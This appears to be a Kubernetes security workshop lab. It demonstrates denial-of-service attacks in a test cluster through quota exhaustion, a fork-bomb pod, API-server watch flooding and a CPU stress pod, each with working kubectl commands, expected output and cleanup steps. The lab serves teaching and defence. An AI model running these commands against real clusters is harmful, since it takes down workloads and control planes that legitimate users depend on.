# Denial of Service

An attacker with the ability to create workloads in a Kubernetes cluster has multiple paths to deny service to legitimate users — from exhausting namespace resource quotas so no new pods can be scheduled, to running fork bombs inside containers, to flooding the Kubernetes API server with requests that degrade control-plane responsiveness.

## Description

Denial of Service (DoS) in Kubernetes differs from traditional network-layer DoS. Because the API server is the control plane for the entire cluster, attacks that overload it affect not just individual applications but cluster management itself. Key vectors include:

- **Resource quota exhaustion**: Create many pods or deployments until the namespace quota is full. Legitimate workloads cannot be scheduled and autoscalers cannot create new replicas.
- **Fork bombs inside containers**: A process that exponentially forks child processes exhausts the node's process table and CPU, degrading all workloads on that node. When resource limits are absent, the blast radius spans the entire node.
- **Node resource exhaustion**: Deploy pods with no CPU/memory limits. A single aggressive pod can consume all node resources, causing OOM kills of neighboring pods.
- **API server request flooding**: An attacker with API credentials can send high volumes of LIST/WATCH requests against large resources (e.g., `kubectl get pods --all-namespaces --watch`), consuming API server CPU and connection slots.
- **CVE-based attacks**: CVE-2019-9512 (HTTP/2 Ping Flood) and CVE-2019-9514 (HTTP/2 Reset Flood) specifically targeted the Kubernetes API server's gRPC/HTTP2 stack.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has `create` permissions on Pods and Deployments in the target namespace.

## Quick Start

### Step 1 — Deploy the target environment

Deploy a victim application and a ResourceQuota that caps the namespace:

```bash
kubectl apply -f dos-scenarios.yaml
```

Verify the victim app and quota are in place:

```bash
kubectl rollout status deployment/victim-app -n dos-lab
kubectl describe resourcequota dos-lab-quota -n dos-lab
```

Expected output:

```
Name:            dos-lab-quota
Namespace:       dos-lab
Resource         Used  Hard
--------         ----  ----
pods             1     10
requests.cpu     50m   1
requests.memory  64Mi  512Mi
```

Confirm the victim app is reachable:

```bash
kubectl run curl-test --image=curlimages/curl:latest --restart=Never --rm -it \
  -n dos-lab -- curl -s http://victim-app/
```

### Step 2 — Resource quota exhaustion

Deploy the `quota-exhauster` and scale it up until the quota is full. Each replica consumes 10m CPU and 16Mi memory:

```bash
kubectl apply -f pod-flood.yaml
```

Scale the deployment up to fill the quota:

```bash
kubectl scale deployment quota-exhauster --replicas=8 -n dos-lab
```

Watch the quota fill up in real time:

```bash
kubectl describe resourcequota dos-lab-quota -n dos-lab
```

Expected output (quota nearly full):

```
Name:            dos-lab-quota
Namespace:       dos-lab
Resource         Used   Hard
--------         ----   ----
pods             9      10
requests.cpu     130m   1
requests.memory  192Mi  512Mi
```

Now attempt to scale the legitimate victim app — this simulates an autoscaler or operator trying to create new replicas under load:

```bash
kubectl scale deployment victim-app --replicas=3 -n dos-lab
kubectl get pods -n dos-lab
```

Expected output — new victim-app pods stay `Pending`:

```
NAME                              READY   STATUS    RESTARTS   AGE
quota-exhauster-xxxxxxx-xxxxx     1/1     Running   0          1m
...
victim-app-xxxxxxxx-yyyyy         0/1     Pending   0          5s
```

Describe the pending pod to see the quota rejection:

```bash
PENDING_POD=$(kubectl get pod -n dos-lab -l app=victim-app \
  --field-selector=status.phase=Pending \
  -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
kubectl describe pod -n dos-lab "$PENDING_POD" | grep -A5 "Events:"
```

Expected output:

```
Events:
  Warning  FailedCreate  ...  Error creating: pods "victim-app-..." is forbidden:
           exceeded quota: dos-lab-quota, requested: pods=1,
           used: pods=10, limited: pods=10
```

The namespace quota is exhausted. No new pods — including legitimate ones — can be scheduled.

### Step 3 — Fork bomb inside a container

A fork bomb exploits the lack of process count limits (if not set via `pids` cgroup) to exhaust the node's process table. With CPU limits set the blast radius is limited to the pod's cgroup; without limits it can impact the entire node.

The fork-bomb pod is defined in `dos-scenarios.yaml` and is created in Step 1. To observe its behavior interactively, scale down the quota-exhauster, delete and re-create the pod:

```bash
# Scale down the quota-exhauster first to free up quota for this pod
kubectl scale deployment quota-exhauster --replicas=0 -n dos-lab

# Delete the existing fork-bomb pod (if already Completed/Error from Step 1)
kubectl delete pod fork-bomb -n dos-lab --ignore-not-found

# Re-apply to create a fresh fork-bomb pod
kubectl apply -f dos-scenarios.yaml
```

Watch the pod status immediately after creation:

```bash
kubectl get pod fork-bomb -n dos-lab -w
```

Expected sequence:

```
NAME        READY   STATUS              RESTARTS   AGE
fork-bomb   0/1     ContainerCreating   0          1s
fork-bomb   1/1     Running             0          3s
fork-bomb   0/1     Error               0          8s
```

The container is killed by the cgroup memory limit (exit code 137 = SIGKILL). If the pod had no resource limits, the memory exhaustion would propagate until the node's kernel OOM killer acted indiscriminately, impacting all workloads on the node.

Note: On some container runtimes/kernels the status shows `OOMKilled` rather than `Error`. In both cases exit code 137 confirms the process was killed by the out-of-memory killer.

Check what the kubelet reported:

```bash
kubectl describe pod fork-bomb -n dos-lab | grep -A10 "Last State\|Reason\|Exit Code"
```

### Step 4 — API server request flooding

An attacker with API credentials can degrade control-plane performance by issuing high-volume streaming requests. This simulates the pattern used in CVE-2019-9512/9514 style attacks without requiring a specific vulnerable version:

```bash
# Open 5 concurrent long-running LIST+WATCH streams against the API server.
# This ties up API server goroutines and etcd watchers.
for i in $(seq 1 5); do
  kubectl get events --all-namespaces --watch &
done

# Observe API server latency while the watchers are open
kubectl get --raw /metrics | grep apiserver_request_duration_seconds_bucket | \
  grep '"list"' | tail -5

# Clean up background watchers
jobs -p | xargs -r kill
```

In a real attack the flooding would be sustained over minutes or hours from multiple concurrent clients, each issuing resource-intensive LIST operations (e.g., listing all pods/events/secrets cluster-wide).

### Step 5 — Node resource exhaustion (no-limits pod)

Create a pod with no resource limits that runs a CPU stress workload, simulating a misbehaving or attacker-controlled container that saturates the node:

```bash
kubectl run node-exhaustor \
  --image=progrium/stress:latest \
  --namespace=dos-lab \
  --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"node-exhaustor","image":"progrium/stress:latest","command":["stress","--cpu","4","--timeout","86400"],"resources":{"requests":{"cpu":"100m","memory":"64Mi"}}}]}}'
```

Note: The `dos-lab` namespace has a ResourceQuota that requires explicit resource requests. The `--overrides` flag is used to satisfy the quota requirements while still leaving the container without explicit CPU limits — demonstrating the risk of missing limit enforcement when a quota only mandates requests.

Observe node-level CPU impact (requires metrics-server):

```bash
kubectl top nodes
```

Expected output — node CPU spikes to near 100%:

```
NAME                         CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%
workshop-cluster-control-plane  3850m     96%    600Mi           30%
```

Legitimate pods on the same node experience increased latency and may begin failing health checks, causing cascading restarts.

Clean up the stress pod:

```bash
kubectl delete pod node-exhaustor -n dos-lab
```

## Cleanup

```bash
kubectl delete -f pod-flood.yaml --ignore-not-found
kubectl delete -f dos-scenarios.yaml --ignore-not-found
kubectl delete namespace dos-lab --ignore-not-found
jobs -p | xargs -r kill 2>/dev/null || true
```

## Resources

- [Kubernetes ResourceQuota](https://kubernetes.io/docs/concepts/policy/resource-quotas/)
- [Container and Pod Resource Management](https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/)
- [CVE-2019-9512 — HTTP/2 Ping Flood](https://nvd.nist.gov/vuln/detail/CVE-2019-9512)
- [CVE-2019-9514 — HTTP/2 Reset Flood](https://nvd.nist.gov/vuln/detail/CVE-2019-9514)
- [MITRE ATT&CK — Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499/)
- [MITRE ATT&CK for Kubernetes — Denial of Service](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Denial%20of%20service/)
